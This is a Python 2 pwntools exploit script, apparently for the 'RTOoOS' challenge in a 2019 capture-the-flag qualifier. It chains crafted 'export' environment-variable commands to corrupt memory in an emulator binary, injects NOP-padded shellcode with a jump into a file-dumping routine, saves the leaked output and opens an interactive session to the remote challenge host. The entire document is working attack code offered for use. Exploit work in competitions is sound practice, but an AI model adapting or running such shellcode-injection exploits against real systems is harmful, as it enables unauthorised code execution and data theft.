#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from pwn import *
from subprocess import Popen, PIPE
from time import sleep
import sys

binary_file = './emu'
libc_file   = '/lib/x86_64-linux-gnu/libc.so.6'

context.arch = 'amd64'
context.os   = 'linux'
context.terminal = ['tmux', 'split-window', '-h']

#binary = ELF(binary_file)
libc   = ELF(libc_file)
env = { "LD_PRELOAD": libc_file }

gdbscript = '''
file {binary_file}
peda

set $code    = 0x112233440000
set $info    = 0x112233441630
set $name    = 0x112233441650
set $pointer = 0x112233444650

# breakpoints
# after exec_command
#hb *0x149b + $code

# exit
hb *0x11 + $code
'''.replace('{binary_file}', binary_file)

last_base = 0x42ce
pointers  = 0x4650

def recv_menu(tube):
    tube.recvuntil('[RTOoOS> ')

def export(tube, s):
    recv_menu(tube)
    tube.sendline('export ' + s)

def show(tube):
    recv_menu(tube)
    tube.sendline('env')

def do_exit(tube):
    recv_menu(tube)
    tube.sendline('exit')

def main():
    if len(sys.argv) == 2 and sys.argv[1] == '--local':
        tube = process([binary_file], env=env, stderr=sys.stderr)
    elif len(sys.argv) == 2 and sys.argv[1] == '--attach':
        tube = process([binary_file], env=env, stderr=sys.stderr)
        gdb.attach(tube, gdbscript=gdbscript)
    elif len(sys.argv) == 2 and sys.argv[1] == '--remote':
        tube = remote('rtooos.quals2019.oooverflow.io', 5000)
        #tube = ssh('user', 'gimme-yourshell.ctf.insecurity-insa.fr', password='deadbeef', port=2225)
        #tube.run(binary_file)
    else:
        tube = gdb.debug([binary_file], aslr=False, env=env, gdbscript=gdbscript)

    export(tube, str(0) + '=' + str(0) * 0x1f0)
    for i in range(1, 6):
        export(tube, str(i) + '=' + str(i) * (0x1f0) + '$' + str(i-1))
    export(tube, str(6) + '=' + str(6) * (0x1f0-0x68) + '$' + str(5))
    shellcode = '\x90' * (0x11 - 1)
    with open('shellcode', 'rb') as f:
        shellcode += f.read()
    shellcode += '\xeb' + chr(0x87 - len(shellcode) - 3) # jump to do_cat
    shellcode += '\x90' * 0x10
    export(tube, str(0) + '=' + shellcode)
    do_exit(tube)
    data = tube.recvuntil('[RTOoOS> ')[:-9]
    with open('honcho', 'wb') as f:
        f.write(data)
    tube.interactive()

if __name__ == '__main__':
    main()
